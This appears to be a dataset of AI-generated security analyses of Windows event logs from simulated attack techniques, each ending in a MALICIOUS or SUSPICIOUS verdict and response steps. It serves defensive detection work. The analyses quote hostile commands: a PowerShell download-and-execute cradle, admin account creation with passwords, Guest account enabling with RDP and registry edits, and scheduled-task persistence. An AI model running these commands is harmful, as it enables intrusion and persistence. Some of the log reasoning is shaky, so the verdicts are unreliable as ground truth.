WinPwn - Loot local Credentials - Safetykatz,"### Analysis of Logs:

#### System Log Analysis:
- The system logs indicate regular time synchronization events with `time.windows.com`. Events with `svchost.exe` adjusting times are normal in the context of network time synchronization. There is no indication in the system logs of any abnormalities or errors with time synchronization.

#### Security Log Analysis:
- Security logs reflect normal Windows audit logs. Event IDs related to time adjustments performed by the `svchost.exe` process for the LOCAL SERVICE (S-1-5-19) without any unexpected changes. There are no explicit signs of privilege escalation or unauthorized access.

#### Application Log Analysis:
- Application logs show expected events regarding Windows Defender being active and running. The entries related to the `edgeupdate` service stopping are typical entries during update sequences. No anomalies or signs of compromise are evident here.

#### Sysmon Log Analysis:
- The Sysmon logs show a sequence of process creations around the usage of PowerShell and sequence of updates related to Microsoft Edge.
- A suspicious entry is the execution of PowerShell on the host, notably with the command:
  ```
  ""powershell.exe"" & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), safedump -consoleoutput -noninteractive}
  ```
  This indicates a PowerShell script being downloaded and executed from the internet, which is a typical method used for malicious activities, such as downloading and executing a script without explicit user knowledge.

#### Windows PowerShell Log Analysis:
- Further confirmation of the PowerShell script execution is found within the Windows PowerShell logs. Each event corroborates the activity captured in the Sysmon log, indicating the PowerShell download and execution attempt.

### Conclusion and Assessment:
The logs reveal a significant indicator of malicious activity involving a PowerShell script being downloaded and executed from a remote location on the internet. This action stands out as anomalous and potentially harmful, suggesting that the host may have been subject to a script-based attack likely aimed at executing further malicious activity.

**Resolution: MALICIOUS - The PowerShell activity poses a significant security threat and confirms malicious intent.**

### Guidance:
1. Immediately isolate the host `Server002` to prevent further escalation or communication with potential command and control servers.
2. Conduct a thorough examination and assess any further changes possibly made by the executed script.
3. Initiate a full investigation of the network traffic around the time of the PowerShell event to identify data exfiltration or additional command activities.
4. Review endpoint security policies to ensure PowerShell logging, intrusion detection/prevention mechanisms are adequately configured, and enhance user awareness around unsolicited PowerShell commands.
5. Analyze additional logs to identify other potentially infected hosts and assess any other compromised accounts."
Download Macro-Enabled Phishing Attachment,"Upon examining the provided Windows event logs, there are several indicators of potentially suspicious or malicious behavior:

### Analysis of Logs

**1. Windows PowerShell Logs:**
   - Logs indicate the execution of PowerShell commands intended to download a file from a URL: `https://github.com/file/file-file/raw/master/files/data.001/bin/PhishingAttachment.xlsm`.
   - The host application is `powershell.exe` with command lines that explicitly set the security protocol and use `Invoke-WebRequest`.
   - The URL suggests downloading a file which appears to be labeled as a ""PhishingAttachment.xlsm"", which is a macro-enabled Excel file, typically associated with phishing and delivering malware payloads.

**2. Security and Sysmon Logs:**
   - The security logs show time changes made by `svchost.exe` indicating possible time manipulation, which can be characteristic of certain malicious activities attempting to evade logging by desynchronizing timestamps.
   - The Sysmon logs show multiple executions of system processes by the user `SERVER002\admin_test` â€” notably `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `powershell.exe`.
   - The repeated execution of `wevtutil.exe` could signal attempts to clear or tamper with event logs as this utility manages event logs.
   - Multiple instances launched in a short time frame might hint at an automated script or sequence of operations intended to cover tracks.

**3. Application Logs:**
   - The `Software Protection Platform Service` logs seem unrelated to malicious activity but note the timing aligns with the suspect behavior in PowerShell and Sysmon logs.

### Assessment & Threat Evaluation
- **Suspicious Download**: The PowerShell logs are a significant red flag. The download of a macro-enabled Excel file from an external URL labeled as a phishing attachment strongly suggests a compromise attempt.
  
- **Log Tampering Potential**: The Sysmon entries concerning `wevtutil.exe` and time changes indicate potential tampering with system state or logs, which could be part of an obfuscation strategy.

### Resolution
Given the identified indicators of compromise, particularly the PowerShell activities and subsequent potential log tampering or reconnaissance activities, this scenario is assessed as **MALICIOUS**.

### Guidance on How to Proceed
1. **Immediate Containment and Isolation**: Disconnect the host `Server002` from the network to prevent further potential malicious external communications.
2. **Further Investigation**: Use Threat Intelligence to check the URL and downloaded file against known malicious databases. Conduct a memory analysis or disk forensic to recover and analyze the downloaded file.
3. **Review User Activity Logs**: Investigate the actions and recent login activity of `SERVER002\admin_test` to determine if the user account has been compromised.
4. **Update Detection Systems**: Strengthen monitoring of PowerShell activities and enhance Sysmon configurations to detect similar patterns in other systems.
5. **Follow-Up Scanning**: Conduct thorough scans with updated antivirus and endpoint protection systems for malware associated with known phishing attachments.
6. **Incident Report**: Document findings and report the indicators and actions taken to the incident response team for broader awareness and response coordination."
Create local account with admin privileges,"Upon analyzing the provided event logs from the Windows host, I've identified several points that suggest potential malicious activities:

1. **Time Manipulation:**
   - Multiple events show the system time being changed (Security Event ID 4616). Alterations in system time can be used to confuse logs or evade detection systems.

2. **Suspicious User Accounts Management:**
   - The creation of a new user account named ""art-test"" and adding it to the ""Administrators"" group (Security Event IDs 4720, 4728, 4732, 4738) is highly suspect. Such actions often indicate unauthorized privilege escalation attempts.

3. **Command-line Activity:**
   - A command executed through `cmd.exe` adds a new user and modifies its privileges (Sysmon Event ID 1 shows `cmd.exe` with command line `/c net user art-test /add & net user art-test -4RTisCool!-321 & net localgroup administrators art-test /add`). This behavior is characteristic of malicious scripts or compromised user accounts.

4. **Process Execution:**
   - Several processes executed under the context of the new suspicious user account, ""admin_test"" (Sysmon logs), which aligns with the creation and manipulation observed in the accounts' events. 

5. **Windows Services and Sysmon:**
   - While the logs show various Windows services' activities (Sysmon Event ID 5), the activities surrounding Microsoft Edge updates seem legitimate but should be monitored further if linked to the suspicious user account actions.

Based on these observations, there is a strong indication of unauthorized activity that could compromise the security of the Windows host. The logs suggest the creation and privilege escalation of a possibly rogue user account, indicative of potential malicious intent.

**Resolution: MALICIOUS**

**Recommended Actions:**
- Immediately investigate the user ""admin_test"" and check for other unexpected administrative accounts on the system.
- Conduct a root cause analysis to find the initial access vector.
- Double-check system integrity and look for signs of backdoor installations or other persistence mechanisms.
- Reset affected accounts and enforce security policies such as multi-factor authentication and strict audit logging. 
- Remediate potential vulnerabilities exploited during this incident and advise on security training to mitigate social engineering attempts targeting privileged accounts."
Activate Guest Account,"Based on the analysis of the provided logs, the following observations can be made:

### Application Log
- The logs primarily show service events related to ""edgeupdate"" with services being stopped. These don't inherently suggest malicious activity.

### Sysmon Log
- The logs show several executions of system processes like `wevtutil.exe`, `conhost.exe`, and `HOSTNAME.EXE`, which are normal and can be part of legitimate user or administrative actions.
- A notable command is `cmd.exe /c net user guest /active:yes`, indicating the ""Guest"" account has been activated. Activating the Guest account is generally unusual and may have security implications due to its historically less secure nature. This activity, executed by user `admin_test`, stands out as suspicious.

### Security Log
- Events show changes in user account attributes for the ""Guest"" account. Specifically, it was enabled by a user `admin_test`. This corroborates the `cmd.exe` action seen in the Sysmon log.
- The enabling of the Guest account is tagged with Event IDs 4798, 4722, and 4738, associated with enumerating local group membership, enabling a user account, and modifying user account properties, respectively.

### System Log
- These logs contain records of time sync activities which are not inherently malicious but show that the system time was adjusted.

### Overall Assessment
- **Suspicious Activity:** The enabling of the ""Guest"" account (`cmd.exe /c net user guest /active:yes`) is indicative of potential suspicious behavior. The Guest account, by default, should remain disabled due to the minimal default privileges that can be easily escalated if not properly managed.
- **Potential Risks:** Unauthorized enabling of the Guest account may imply insider threat aspects or misconfiguration, allowing unauthorized access or privilege escalation.

### Resolution
- **SUSPICIOUS:** The activity of enabling the Guest account without clear business or operational justification is suspicious and warrants further investigation. Verify the intention behind enabling the Guest account. Check for any authentication logs related to the Guest account and ensure the system's recent changes align with organizational security policies.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Disable the Guest account if not approved.
   - Verify recent changes by `admin_test` for any unauthorized or unsanctioned activities.
   - Conduct a security audit to check for similar instances across the network.
   
2. **Further Investigation:**
   - Review additional logs for any sign of exploitation or suspicious access patterns related to `admin_test`.
   - Inspect the rationale behind executing `wevtutil.exe` and other sysadmin-like actions for legitimacy.
   
3. **Preventative Measures:**
   - Strengthen logging and monitoring for suspicious administrative activity.
   - Enforce strict control over account management and changes to user account privileges."
Enable Guest account with RDP capability and admin privileges,"Upon analyzing the provided Windows event logs, the following observations and assessments were made:

1. **Suspicious Activity**:
   - The logs capture various activities involving the Windows `cmd.exe` and `net.exe` utilities, which are performing actions such as enabling the Guest user account, setting a password, and adding the Guest user to the ""Administrators"" and ""Remote Desktop Users"" groups. Such actions are notable indicators of unauthorized privilege escalation:
     ```plaintext
     net user guest /active:yes
     net user guest Password123!
     net localgroup Administrators guest /add
     net localgroup ""Remote Desktop Users"" guest /add
     ```

   - These actions were performed using a high integrity-level process under the user `admin_test`, which is suspicious unless explicitly authorized for ongoing administrative tasks or maintenance.

2. **Indicators of Compromise**:
   - Use of `cmd.exe` with elevated privileges to modify user accounts and system settings without clear context or authorization logged in the events suggests potential malicious activity aimed at establishing persistent unauthorized access.
   - Registry modifications were made to terminal services settings, enabling Remote Desktop connections:
     ```plaintext
     reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f
     reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f
     ```

3. **Additional Observations**:
   - The Sysmon events show multiple executions of system utilities (conhost, wevtutil), which are not inherently suspicious but warrant scrutiny to check alignment with legitimate tasks.
   - No evident proof in the logs of a known exploit or malware directly; however, the command sequences executed are typical of actions a malicious actor might take to gain control or backdoor a compromised system.

**Assessment**: Based on identified unauthorized privilege escalation activities and system modifications aligning with common malicious goals (persistence and remote access via RDP), these logs likely indicate a compromise.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediate investigation and response actions should be taken to contain any potential threat.
- Validate the actions with responsible personnel if any intentional maintenance was performed.
- Consider isolating the system from the network and initiating forensic analysis to understand the scope of the breach.
- Conduct a full security audit and review any recent changes or accesses.
- Ensure system patches and hardened configurations, possibly leading to gaps exploited by the malicious actor, are up-to-date."
Word spawned a command shell and used an IP address in the command line,"Based on the provided Windows event logs, several activities stand out and require analysis:

1. **PowerShell Events**: 
   - There are PowerShell logs that indicate a suspicious script execution. The PowerShell command includes downloading and executing a script from `https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1`, which is not a typical or trusted location for script execution. Additionally, it uses `IEX` (Invoke-Expression) and `iwr` (Invoke-WebRequest), commonly used in malicious activities or when interacting with remote scripts. This command also creates a `.jse` file in the public folder, which may suggest a script attempting to execute further commands.

2. **Security Logs**:
   - Logon Event (ID 4624) and Special Privileges Assigned (ID 4672) are noted for the SYSTEM account, which isn't inherently suspicious. However, combined with other activity, such as script execution, this could indicate an abuse of privileged accounts.
   - Multiple instances of Event ID 5379, which involve credential validation and return codes indicating some failed attempts or unusual credential access patterns.

3. **Sysmon Logs**:
   - Multiple processes related to Microsoft Edge Update are executed, which is common in a legitimate update process. However, they are interspersed with suspicious PowerShell activity.
   - Processes such as `wevtutil.exe` and `conhost.exe` executed under an account named `admin_test` might warrant further investigation, especially if this account should not usually have such activity or if it was recently created or modified.

Overall, the logs suggest that there is an active script attempting to interact with the system in a potentially malicious manner, given the usage of a public GitHub script, PowerShell command execution, and the writing of a script file to a public directory.

**Assessment and Resolution**:
- **SUSPICIOUS**: The PowerShell activity is highly suspicious and could indicate potential malicious behavior. Combined with some security log entries, it represents activity that requires immediate further investigation. However, without definitive evidence of malicious payload execution or successful compromise, it cannot be categorically labeled as malicious yet.

**Guidance on How to Proceed**:
1. **Immediate Containment**: Isolate the host if possible to prevent further potential spread or damage.
2. **Further Investigation**: 
   - Examine the script downloaded from GitHub to understand its purpose.
   - Verify account activity, especially for `admin_test`, to ensure no unauthorized changes were made.
   - Review recent changes to scheduled tasks or newly created tasks that might have been set by the script.
3. **Monitoring**: Increase monitoring of host activities and network traffic for unusual or further suspicious actions.
4. **Validation**: Check with the responsible team if the PowerShell command and downloading script is known or authorized.

Taking these actions will ensure the host's integrity and uncover any additional signs of compromise that need addressing."
Octopus Scanner Malware Open Source Supply Chain,"In analyzing the provided logs, several elements need scrutiny to determine the likelihood of malicious activities:

1. **Edge Update and Microsoft Edge Components:**
   Many entries indicate the execution of processes related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`). These are legitimate processes responsible for updating Microsoft Edge and typically run under the `NT AUTHORITY\SYSTEM` user. This alone is not inherently malicious if they are appropriately signed and scheduled.

2. **Commands Using cmd.exe and schtasks:**
   - EventID 18003 involves a `cmd.exe` execution with the following command: `copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db & schtasks /create /tn ExplorerSync /tr ""javaw -jar %temp%\..\Microsoft\ExplorerSync.db"" /sc MINUTE /f`.
   - Using `schtasks` to schedule Java processes with `javaw -jar` under `SERVER002\admin_test` is anomalous as scheduled tasks that execute frequently can indicate persistence mechanisms exploited in malicious activities.
   - The SHA256 hash for `cmd.exe` execution (`BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0`) is necessary to verify against known hashes to detect if it belongs to any known malware.

3. **PowerShell Execution:**
   There are instances of `powershell.exe` initiated by `SERVER002\admin_test` without clear indications in associated scripts or command-line arguments. This might suggest manual or automated script execution potentially for administrative or malicious purposes.

4. **Frequent Use of `whoami` and `hostname`:**
   Commands like `whoami.exe` and `hostname.exe` are typically used to gather user and system information. The context in which these were executed (`SERVER002\admin_test`) could be for benign administrative purposes; however, they are often used in scripts by threat actors to understand the compromised environment.

5. **Use of `wevtutil.exe`:**
   The repeated execution of `wevtutil.exe` under `SERVER002\admin_test` may imply an attempt to manage or clear event logs, a task often associated with an attempt to cover tracks.

Upon closely examining these points and their context:

- **Scheduled Tasks** using `schtasks`: Although scheduling tasks is not inherently malicious, the specifics here seem to execute potentially malicious payloads without a clear administrative reason.
- **PowerShell, cmd execution, and event logs management**: Possible misuse or manipulation indicates more than routine system administration.

**Resolution: SUSPICIOUS**

The activities found in the logs do not provide definitive evidence of malicious intent but exhibit several behaviors that are suspect, particularly the creation of schedule tasks with unclear purposes and system utility usage patterns typical of threat actors. Further investigation and validation are recommended, such as the examination of:
- The legitimacy of `Java` files and scheduled tasks.
- The hash values against threat intelligence databases.
- The context and necessity of PowerShell scripts or commands executed by `admin_test`.
- Validation of executed binaries' signatures when suspicious patterns are identified.

Given these considerations, increased monitoring, log retention, and the deployment of additional security controls and audits are advisable to ensure the integrity of systems and prevent potential threats."
Use PsExec to elevate to NT Authority\SYSTEM account,"### Analysis of the Logs

**1. Security Log:**
- **Event ID 1102 (LogFileCleared)**: This event indicates that event log entries were cleared, which could be indicative of an attempt to hide malicious activity. This action was performed by user `admin_test`.
- **Event ID 4624 and 4672**: Several logs showing successful logons with elevated privileges by the `SYSTEM` account. While SYSTEM processes often have privileges, the sequence around the time of the logs being cleared is suspicious.
- **Event ID 5379**: Multiple credential validation logs with a non-zero return code indicate failed credential operations. This alone is not malicious, but in conjunction with the 1102 event, it raises concerns.
- **Event ID 4798**: Queries related to user account groups, which suggests reconnaissance activities.

**2. System Log:**
- **Event ID 104 (LogFileCleared)**: Similar to the security log, system and PowerShell logs were cleared by the same user, `admin_test`. This further indicates potential malicious intent to cover tracks.

**3. Sysmon Log:**
- **Process Executions**:
  - Multiple executions of `wevtutil.exe` to clear different logs (`Sysmon`, `Application`, `System`, `Security`, and `Windows PowerShell`), all executed by `admin_test`.
  - Use of `PsExec` and `PSEXESVC.exe` services. `PsExec` is a legitimate tool often used for administrative tasks but is also frequently used by attackers to execute commands remotely.
  - Command lines with suspicious parent-child process relationships, notably involving `cmd.exe` and `whoami.exe`, suggesting an enumeration or privilege escalation attempt.
  
**4. Observations:**
- **Clearing of Event Logs**: The act of clearing logs, especially across different channels, is a strong indicator of nefarious activity, typically done to obfuscate malicious actions.
- **Use of PsExec**: While PsExec can be legitimate, its use, combined with log clearing, suggests potential unauthorized remote execution potentially for lateral movement.
- **Patterns and Correlations**: The use of administrative tools, combined with log clearing and elevated logon sessions, suggests activities consistent with an adversary leveraging compromised credentials to establish persistence and conduct reconnaissance.

### Assessment
- **Indicators of Compromise**:
  - The timeline of clearing logs followed by elevated logons and suspicious process executions.
  - Usage of administrative tools like PsExec in this context is consistent with lateral movement tactics used in attacks.
  
### Final Resolution
- **Resolution: MALICIOUS**

### Guidance on how to proceed:
1. **Immediate Response**:
   - Isolate the affected host (Server002) to prevent further potential compromise.
   - Change passwords for the `admin_test` account and other potentially compromised accounts.
   
2. **Forensic Investigation**:
   - Conduct a deeper forensic analysis of the host to confirm the vector of compromise.
   - Review network logs to trace source IPs and any lateral movement to other systems.

3. **Remediation**:
   - Reinforce security policies, including better logging practices.
   - Train personnel on detecting and preventing similar cyber threats in the future.
   - Conduct a security audit to ensure no further vulnerabilities allow misuse of administrative tools."
WinPwn - Loot local Credentials - powerhell kittie,"Based on the analysis of the provided Windows event logs, the following observations can be made:

1. **PowerShell Logs:**
   - There is evidence of PowerShell execution that includes downloading and executing a script from an external source (""https://raw.githubusercontent.com/script/.../script.ps1""). This is executed using the `iex(new-object net.webclient).downloadstring(...)` technique. The use of `iex (Invoke-Expression)` along with downloading from an external source can be indicative of a potentially malicious activity, especially if the script contents and source are not verified as benign. It's crucial to determine whether the script being downloaded is legitimate or not. Additionally, a particular command `obfuskittiedump -consoleoutput -noninteractive` is used which does not appear to be standard or well-known, and could be indicative of obfuscated or malicious behavior.

2. **Sysmon Logs:**
   - Multiple processes were spawned correlated with administrative privileges. However, the images and executions correlate mostly with benign system operations. Aside from the EdgeUpdate and installer images, there is no anomalous or obvious malicious behavior directly observed from the process execution logs. 

3. **Security Logs:**
   - There is a sequence where a user ""admin_test"" with various privileges logs in and out and performs regular administrative tasks. The allocation of privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, and other high-level rights) requires scrutiny, as such privileges enable broad access to system functions. However, the behavior itself is not inherently malicious if executed by a legitimate user with authorized needs.

4. **System Logs:**
   - These reflect regular time updates and adjustments indicating normal system operations, with no apparent signs of malicious activity.

5. **Application Logs:**
   - The logs show Windows Defender being active, suggesting that it was operational during these events. There is also frequent operation of the Edge Update services with records of service stops, which might relate to expected update operations.

**Assessment:**
The use of PowerShell to download and execute a remote script is highly suspicious and warrants further investigation to ensure it is not malicious. Other logs show regular operational activity, which corroborates standard system and update operations.

**Resolution: SUSPICIOUS**
Actionable Guidance:
- Investigate the source and content of the downloaded PowerShell script to ensure it is not malicious. This involves verifying the URL, examining script contents, and understanding the context of the execution.
- Confirm the legitimacy of the user ""admin_test"", and ensure that the administrative activities are sanctioned and recognized within the operational context.
- Monitor for any related anomalous behavior in subsequent logs or related systems."
USB Malware Spread Simulation,"### Detailed Analysis of Logs

Upon review of the provided log entries, the following key observations were made:

#### Windows PowerShell Log

1. **PowerShell Script Activity**: 
   - The script execution in these logs indicates the presence of PowerShell activity which is executing a script that identifies removable drives and attempts to create files on them. The comment within the script references the creation of a file with text to ""simulate malware spread to removable drives"".
   - The creation of files on removable drives is a technique often used by malware to propagate itself, which is inherently suspicious.

#### System Log

1. **General System Activity**:
   - The entries mostly refer to time synchronization and regular system activities like Kernel General events. No unusual or explicitly malicious entries are apparent in these logs.

#### Application Log

1. **Security Product State**:
   - The logs indicate that Windows Defender was active at the time of these entries, which should provide some level of defense against known threats.

#### Sysmon Log

1. **Process Creation Activity**:
   - There are multiple executions of typical Windows utilities (e.g., `wevtutil`, `conhost`, `whoami`, `powershell`, etc.). The execution of scripts using `powershell.exe` correlates with the PowerShell log entries indicating potential misuse in the form of scripting for malware distribution.
   - The `whoami` and `hostname` utilities were also executed, which might be part of a script checking the environment, although in isolation not typically malicious.

2. **User Context**:
   - The PowerShell commands and various utilities are being executed under the context of a user `admin_test`, suggesting administrative access which allows scripting and changes to the system.

#### Security Log

1. **Time Change Entry**:
   - The security log entries reference typical log entries related to time change, such as those executed by services. These do not immediately suggest malicious activity.

### Assessment

- **Suspicious PowerShell Activity**: The execution of the PowerShell script indicates a potentially malicious attempt to create files on removable drives, suggesting possible replication or data exfiltration activities.
- **Administrative Privilege**: The activities were consistently run under an administrative user account (`admin_test`), which allows more unrestricted access to system resources, increasing potential risk.
- **Potential Malicious Behavior**: The act of creating files with a note regarding spreading malware strongly leans towards intentional misuse despite other entries not directly indicating additional malicious actions.

### Conclusion

Based on the analysis of the logs, the findings indicate:
- **Resolution: MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Action**:
   - Isolate the affected host to prevent further spread or data exfiltration.
   - Perform a full malware scan using updated definitions, ensuring that Windows Defender or other antivirus solutions are employed.
   
2. **Investigate Further**: 
   - Analyze user `admin_test` login activities and permissions to determine if this account has been compromised.
   - Review policy on removable device usage and restrict/monitor related PowerShell activities.

   - Educate users on security hygiene, specifically around the dangers of scripting and removable media."
Azure Persistence Automation Runbook Created or Modified,"In analyzing the provided Windows event logs, a few points of interest and potential concern emerge. Here is a detailed examination of each aspect:

### Summary of Analysis:
- **PowerShell Logs:**
  - The PowerShell logs reveal multiple instances of PowerShell scripts being executed with the following command:
    ```plaintext
    powershell.exe & {$secure_pwd = """" | ConvertTo-SecureString -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential -ArgumentList """", $secure_pwd
    Connect-AzAccount -Credential $creds
    New-AzAutomationRunbook -Name -Type PowerShell -ResourceGroupName -Description 'my-test-runbook' -AutomationAccountName}
    ```
  - This command shows the creation of a credential object with an empty password and attempts to connect to an Azure account. This is immediately suspicious because:
    - The use of `ConvertTo-SecureString -AsPlainText -Force` with an empty string as the password is concerning and does not follow secure authentication practices.
    - This script potentially indicates unauthorized access attempts to Azure resources or misconfigured automation activities.
   
- **Sysmon Logs:**
  - Sysmon logs show instances of PowerShell being executed and command lines that are generally associated with reconnaissance or configuring environments without user interaction, such as:
    - Processes running under the account ""SERVER002\\admin_test,"" a high privilege account.
    - Execution of PowerShell with command strings that attempt to manipulate or use credentials.
  - There are also multiple entries of non-standard tasks like `wevtutil.exe` which may be used to clear event logs or similar activities, alongside the use of `whoami` and `hostname` for gathering information about the environment.
  
- **Potential Indicators of Compromise:**
  - The command sequences found suggest attempts to connect to cloud infrastructure using potentially malformed or improper credentials.
  - Use of programs like `wevtutil.exe`, `powershell.exe`, `whoami.exe`, and `hostname.exe` in rapid succession could be indicative of an adversary trying to gather system information or cover tracks by manipulating logs.

### Findings:
- The behavior in the logs suggests orchestrations associated with automation scripts or attempted leveraging of cloud resources using PowerShell.
- The absence of any real credential material could indicate a test run or an initial foothold strategy by an attacker.
- High-integrity, privileged accounts running sensitive scripts or commands in a potentially insecure context raise the risk profile.

### Resolution:
Given the identified behaviors and their security implications, I recommend classifying these activities as **SUSPICIOUS**. There's a need for further investigation into:
- Confirmation of the legitimacy of the PowerShell scripts.
- Validation of activities within Azure if the account is valid.
- Examination of the `admin_test` account's recent activities and logs for anomalies or unauthorized access.

### Recommendations:
- Engage with the account manager for `SERVER002\\admin_test` to verify all activities.
- Review and audit Azure activity logs for any unexpected resource changes or access using credentials.
- Implement additional monitoring and alerts for sensitive accounts and PowerShell executions.
- Consider resetting credentials and evaluating automated tasks running from this host to ensure proper security controls are in place."
Running Chrome VPN Extensions via the Registry 2 vpn extension,"Based on the provided logs, here is a detailed analysis highlighting elements that might indicate suspicious or malicious activity:

**Security Log Analysis:**

1. **Events 4624 (Logon) and 4672 (Special Privileges Assigned):** 
   - These logs show Logon Type 5, which is typical for service-related logons and might not indicate malicious activity on their own.
   - The privileged list includes SeDebugPrivilege and SeImpersonatePrivilege, which are used by SYSTEM processes. Such privileges are significant when exploited by non-system applications to escalate privileges. However, here they are used by the SYSTEM account, so it doesn't look anomalous for the scope provided.

2. **Event 5379 (Credential Validation):**
   - This event repeatedly shows unsuccessful attempts (ReturnCode 3221226021) to read credentials or perform authentication-related tasks, which appear under system or service context. The MicrosoftAccount usage does not necessarily imply malicious intent but is worth monitoring.
   - Successful credential operations (CountOfCredentialsReturned=1) should be closely monitored again in integration with other logs.

3. **Events 4798 (Enumeration of Local Groups):**
   - This event signifies local group enumeration attempts made by the SERVER002$ account, which can be normal for group policy tasks but might be suspicious if it aligns with other unauthorized access patterns.

**Windows PowerShell and Sysmon Logs Analysis:**

1. **PowerShell Logs:**
   - There is a PowerShell script that registers Chrome extensions using the registry, which could be an indicator of modifying browser behavior or injecting unauthorized configurations. Such actions require detailed investigation to determine whether they align with administrative scripts or unauthorized modifications.
   - The pattern `$extList` and specific GUID-like identifiers could imply persistence through registry persistence; thus, it is typically suspicious unless verified as legitimate administrative activity.

2. **Sysmon Process Creation Events (ID 1):**
   - Multiple instances of PowerShell and command-line utilities like `wevtutil` and `whoami` executed by the `admin_test` account. The presence of PowerShell and its commands can indicate legitimate administrator activity, but combined with other suspicious behaviors could indicate scrutinized scripting or reconnaissance activities.
   - The PowerShell command with Chrome extension modifications is a red flag indicating potential malicious intent, especially when introduced without typical administrative / IT management deployment protocols.

**Conclusion and Resolution:**

- **Assessment & Risk:**
  - The activities involving PowerShell script execution modifying browser extensions, combined with suspicious credential validation attempts, suggest potential compromise activities with motivations such as persistence and reconnaissance.

- **Guidance & Action:**
  - Cross-reference suspicious script activities with organizational tasks to weed out authorized actions.
  - Examine logs for follow-up activities or additional context (network logs, additional access attempts).
  - Validate Chrome extension registry keys against known safe lists.
  - Consider isolating potentially compromised host to prevent further spread.

**Final Resolution: SUSPICIOUS**

The overall activity found within the logs is suspicious and warrants further investigation. The specific job of the PowerShell script, potential registry tampering, and repeated enumeration attempts require in-depth security review and systemic check, as these could be indicative of an ongoing compromise attempt."
